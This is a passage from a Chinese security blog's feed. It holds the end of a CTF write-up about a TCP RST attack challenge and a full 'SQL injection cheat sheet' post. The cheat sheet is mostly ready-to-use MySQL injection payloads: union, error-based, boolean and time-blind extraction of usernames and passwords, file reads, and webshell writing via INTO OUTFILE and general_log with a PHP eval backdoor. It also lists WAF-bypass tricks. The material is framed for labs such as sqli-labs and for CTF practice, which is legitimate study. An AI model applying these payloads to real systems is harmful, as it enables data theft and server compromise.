data)).encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 连接数大于1，socket就会被关闭。</span></span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">120</span>)</span><br><span class="line">        tcpSerSock.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tcpSerSock.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码中有个比较关键的点：发送数据 *ctf 即可获得 server 端的 flag。</p><p>client 位于另一个主机中，会启动两个服务 app.py 和 client.py。其中app.py 可以查看当前文件的源码，还可以进行任意文件读取（所以后面可以用来获取系统状态）。</p><p>client.py 可以连接到 server 端，但是 server 端和 client 端都保持接收的状态，因此发生阻塞。</p><p>webserver 端位于第三个主机中，主要功能是可以执行 Python 代码。</p><p>整理完后思路就比较清晰了，想办法打断 client 和 server 之间的通信，就可以和 server 进行连接，并且发送 *ctf 从而获得 flag。最直接的方法就是构造 RST 攻击。并且我们已经有了 IP 和 PORT，现在只需要确定 seq 的值即可。</p><p>在这里需要先了解一下TCP协议和RST攻击。</p><p>将题解的 py 文件上传后，在 Server 的docker中一直出现 Perhaps iptables or your kernel needs to be upgraded. 的报错信息，题解中也没有这个问题。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/710B790C-7968-449A-ADDF-C72AC2F6E874.png"></p><p>通过简单的搜索，猜测需要启用 privileged 模式，在 docker-compose 中添加 privilege 之后就可以正常执行了。</p><p>试了3个Payload都打不通……太菜了，也没有调试的思路。🤔</p><h1 id="2-总结"><a href="#2-总结" class="headerlink" title="2 总结"></a>2 总结</h1><p>通过本次的比赛，🧐首先学会了「伪随机数基本原理和特性」、「爆破伪随机数的方法」。在oh-my-socket一题中学会了「基本的socket编程」，巩固了「计算机网络的tcp协议」，了解并熟悉了「docker-compose」的使用。</p><h1 id="3-附录"><a href="#3-附录" class="headerlink" title="3 附录"></a>3 附录</h1><ol><li><a href="https://blog.frankli.site/2021/01/18/*CTF-2021-Web/">frankli</a></li><li><a href="https://mp.weixin.qq.com/s?srcid=0120MMrbwrFlSRrMjmGAfQBd&scene=23&sharer_sharetime=1611113812400&mid=2247485857&sharer_shareid=698544d9c79869eb7ddf10c118934f01&sn=1cf534df42999d5126fc3cf3b7fc8f9b&idx=1&__biz=MzU3ODc2NTg1OA==&chksm=fd711cecca0695faf313845fb30671cd61feee2a62ad9b13f213d4de7a5b64c0dfbb6d2ac31f&mpshare=1#rd">星盟安全</a></li><li><a href="https://github.com/sixstars/starctf2021">官方题解</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 随机数 </tag>
            
            <tag> php </tag>
            
            <tag> rst攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入速查手册（不定期更新）</title>
      <link href="f3a17a5034c5/"/>
      <url>f3a17a5034c5/</url>
      
        <content type="html"><![CDATA[<h1 id="1-利用方式"><a href="#1-利用方式" class="headerlink" title="1 利用方式"></a>1 利用方式</h1><h2 id="1-1-回显数据"><a href="#1-1-回显数据" class="headerlink" title="1.1 回显数据"></a>1.1 回显数据</h2><ul><li>系统信息收集：常见的使用 <code>*</code> 进行标注<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">system_user()     系统用户名</span><br><span class="line">user()            MYSQL用户名 </span><br><span class="line">current_user()    当前用户名</span><br><span class="line">session_user()    连接数据库的用户名</span><br><span class="line">database()        当前数据库名（*）</span><br><span class="line">schema()          当前数据库名</span><br><span class="line">version()         当前数据库版本信息</span><br><span class="line">@@version         数据库版本</span><br><span class="line">load_file()       MYSQL读取本地文件（*）</span><br><span class="line"></span><br><span class="line">@@datadir         Location of DB files</span><br><span class="line">@@hostname        服务器主机名</span><br><span class="line">@@basedir         MYSQL 安装路径</span><br><span class="line">@@version_compile_os    操作系统</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>数据库信息收集<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 查看数据库服务器上的数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看某个数据库里面的数据表</span></span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema =<span class="string">&#x27;数据库名&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看某个数据表里面的字段</span></span><br><span class="line"><span class="comment">--   默认当前数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> COLUMN_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name =<span class="string">&#x27;表名&#x27;</span></span><br><span class="line"><span class="comment">--  指定数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> COLUMN_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name =<span class="string">&#x27;表名&#x27;</span> <span class="keyword">AND</span> table_schema =<span class="string">&#x27;数据库名&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查找字段名为id的数据库名和表名</span></span><br><span class="line"><span class="keyword">SELECT</span> table_schema, table_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> column_name = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限列表</span></span><br><span class="line"><span class="keyword">SELECT</span> grantee, privilege_type, is_grantable <span class="keyword">FROM</span> information_schema.user_privileges;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="1-2-Getshell"><a href="#1-2-Getshell" class="headerlink" title="1.2 Getshell"></a>1.2 Getshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- outfile获取shell（union）</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;pwd&quot;]) ?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;可访问web路径&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 开启日志获取shell（堆叠）</span></span><br><span class="line"><span class="comment">-- 查看配置</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="comment">-- 开启日志</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="comment">-- 设置路径</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;</span>;</span><br><span class="line"><span class="comment">-- 数据写入</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-闭合方式"><a href="#2-闭合方式" class="headerlink" title="2 闭合方式"></a>2 闭合方式</h1><h2 id="2-1-常见类型"><a href="#2-1-常见类型" class="headerlink" title="2.1 常见类型"></a>2.1 常见类型</h2><p>数字、字符、括号型（单侧）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">)</span><br><span class="line">))</span><br><span class="line">&#39;</span><br><span class="line">&#39;)</span><br><span class="line">&#39;))</span><br><span class="line">&quot;</span><br><span class="line">&quot;)</span><br><span class="line">&quot;))</span><br><span class="line">&#96;</span><br><span class="line">&#96;)</span><br><span class="line">&#96;))</span><br><span class="line">%</span><br><span class="line">%)</span><br><span class="line">%&#39;</span><br><span class="line">%&#39;)</span><br><span class="line">%&#39;))</span><br><span class="line">%&quot;</span><br><span class="line">%&quot;)</span><br><span class="line">%&#96;</span><br><span class="line">%&#96;)</span><br><span class="line">%&#96;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-2-两侧闭合型"><a href="#2-2-两侧闭合型" class="headerlink" title="2.2 两侧闭合型"></a>2.2 两侧闭合型</h2><p>insert无法直接回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;&amp;&amp;sleep(3)&amp;&amp;&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-3-Order-by型"><a href="#2-3-Order-by型" class="headerlink" title="2.3 Order by型"></a>2.3 Order by型</h2><p>验证是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 升序排序</span><br><span class="line">?sort&#x3D;1 asc</span><br><span class="line"># 降序排序</span><br><span class="line">?sort&#x3D;1 desc</span><br><span class="line"></span><br><span class="line"># rand() 验证</span><br><span class="line">?sort&#x3D;rand(true)</span><br><span class="line">?sort&#x3D;rand(false)</span><br><span class="line"></span><br><span class="line"># 延时验证</span><br><span class="line">?sort&#x3D;sleep(1)</span><br><span class="line">?sort&#x3D;(sleep(1))</span><br><span class="line">?sort&#x3D;1 and sleep(1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常见利用方式</p><ul><li>报错注入</li><li>布尔注入</li><li>延时注入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 报错1</span><br><span class="line">?sort&#x3D;1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># 报错2</span><br><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&#39;:&#39;,username,password)+FROM+users limit 0,1))),1)</span><br><span class="line"></span><br><span class="line"># 布尔注入</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br><span class="line"></span><br><span class="line"># 延时注入</span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br><span class="line"></span><br><span class="line"># 写webshell</span><br><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.txt&quot;</span><br><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="3-按回显类型"><a href="#3-按回显类型" class="headerlink" title="3 按回显类型"></a>3 按回显类型</h1><h2 id="3-1-联合注入"><a href="#3-1-联合注入" class="headerlink" title="3.1 联合注入"></a>3.1 联合注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 判断字段数目</span></span><br><span class="line">order by 1</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 联合查询收集信息</span></span><br><span class="line">union <span class="keyword">select</span> </span><br><span class="line"><span class="comment">-- 查询当前数据库</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>() </span><br><span class="line"><span class="comment">-- 查询所有数据库</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata </span><br><span class="line"><span class="comment">-- 查询表名</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"><span class="comment">-- 查询列名</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> </span><br><span class="line"><span class="comment">-- 查询字段值</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h2><p>报错注入常见的几种类型：</p><ol><li>BIGINT等数据类型溢出</li><li>xpath语法错误</li><li>concat+rand()+group_by()导致主键重复</li><li>一些特性</li></ol><p>参考：<a href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.7bc1525cu9mqBM&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn">MYSQL报错注入的一点总结-先知社区</a></p><ul><li><p>数据溢出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> ~<span class="number">0</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(<span class="number">709</span>);</span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span>(!x-~<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)a);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p> xpath语法错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="3-3-布尔注入"><a href="#3-3-布尔注入" class="headerlink" title="3.3 布尔注入"></a>3.3 布尔注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 获取当前数据库长度</span><br><span class="line">1&quot; and length(database())&gt;&#x3D; 11 #（）</span><br><span class="line"></span><br><span class="line">2. 获取当前数据库名字</span><br><span class="line">1&quot; and substr(database(), 11, 1)&#x3D;&quot;e&quot; #</span><br><span class="line"></span><br><span class="line">3. 获取库表的总数（还可以使用length）</span><br><span class="line">1&quot; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database()) &gt;&#x3D; 3 #</span><br><span class="line"></span><br><span class="line">4. 获取库表的长度</span><br><span class="line">1&quot; and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1) &gt;&#x3D;0 #</span><br><span class="line"></span><br><span class="line">5. 获取库表的名字</span><br><span class="line">1&quot; and substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 2,1), &#123;pos&#125;, 1)&#x3D;&quot;&#123;c&#125;&quot; #</span><br><span class="line"></span><br><span class="line">6. 获取库表的字段总数</span><br><span class="line">1&quot; and (select count(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;the_cfg&quot;) &gt;&#x3D; 2 #</span><br><span class="line"></span><br><span class="line">7. 获取库表的字段第2个长度</span><br><span class="line">1&quot; and length((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;the_cfg&quot; limit 0,1)) &gt;&#x3D; 0 #</span><br><span class="line"></span><br><span class="line">8. 获取库表的字段第N个字段名</span><br><span class="line">1&quot; and substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;the_cfg&quot; limit 0,1), &#123;pos&#125;, 1)&#x3D;&quot;&#123;c&#125;&quot; #</span><br><span class="line"></span><br><span class="line">9. 获取内容</span><br><span class="line">1&quot; and substr((select cfg_value from the_cfg limit 0,1), &#123;pos&#125;, 1)&#x3D;&quot;&#123;c&#125;&quot; #</span><br><span class="line">注意：substr(str,pos,len);需要注意的是：如果 pos 为 1(而不是0)，表示从第一个位置开始。</span><br><span class="line">limit pos,len ：从 0 开始，后面的 len 代表长度</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-4-时间盲注"><a href="#3-4-时间盲注" class="headerlink" title="3.4 时间盲注"></a>3.4 时间盲注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># SLEEP</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">5</span>);</span><br><span class="line"><span class="comment"># BENCHMARK</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="keyword">sha</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment"># 笛卡尔积</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line"><span class="comment"># GET_LOCK</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">get_lock</span>(<span class="string">&#x27;test&#x27;</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment"># RLIKE</span></span><br><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">RLIKE</span> <span class="keyword">concat</span>(<span class="keyword">repeat</span>(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="4-WAF绕过"><a href="#4-WAF绕过" class="headerlink" title="4 WAF绕过"></a>4 WAF绕过</h1><ol><li>双写</li><li>特殊符号:如：%0b</li><li>宽字节</li><li>两端闭合</li></ol><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>2020 年 n1ctf 中 Web-SignIn 一题中用到的 SQL 语句。使用的报错函数与 <code>exp()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 查询数据库名字</span></span><br><span class="line">database()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询数据库信息</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="number">0x3a</span>,<span class="keyword">user</span>(),<span class="number">0x3a</span>,<span class="keyword">database</span>(),<span class="number">0x3a</span>,@@datadir,<span class="number">0x3a</span>,@@version_compile_os)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询文件读取权限</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">user</span>,<span class="number">0x3a</span>,file_priv) <span class="keyword">from</span> mysql.user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前用户</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询数据库版本</span></span><br><span class="line"><span class="keyword">version</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询表名的长度</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;n1ctf_websign&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) &lt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询表名（修改后面的 limit）</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">DATABASE</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字段名（修改后面的 limit）</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">&#x27;n1key&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询 ip 表。（边插入边查询，需要使用别名）</span></span><br><span class="line"><span class="keyword">SELECT</span> tid <span class="keyword">FROM</span> (<span class="keyword">select</span> ip tid <span class="keyword">from</span> n1ip <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">AS</span> tt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">GROUP_CONCAT</span>(<span class="keyword">id</span>) <span class="keyword">FROM</span> n1key</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(bb.key) <span class="keyword">from</span> n1key bb</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">key</span>) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> n1key) <span class="keyword">as</span> a</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> n1key <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment"># 不使用字段名度值</span></span><br><span class="line"><span class="keyword">SELECT</span> a<span class="number">.2</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> n1key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否有数据</span></span><br><span class="line"><span class="keyword">SELECT</span> (<span class="keyword">SELECT</span> <span class="keyword">key</span> <span class="keyword">FROM</span> n1key) <span class="keyword">IS</span> <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询文件</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考文档：</p><ol><li><a href="https://3wapp.github.io/WebSecurity/mysqlinject.html">Mysql 注入-wiki</a></li><li><a href="https://blog.csdn.net/qq_43085611/article/details/112661431">sqli-labs(全通关刷题笔记)-slug01sh</a></li><li><a href="https://www.onebug.org/websafe/75808.html">Onebug.org | 安全防线</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs(全通关刷题笔记)</title>
      <link href="4b932ba765f8/"/>
      <url>4b932ba765f8/</url>
      
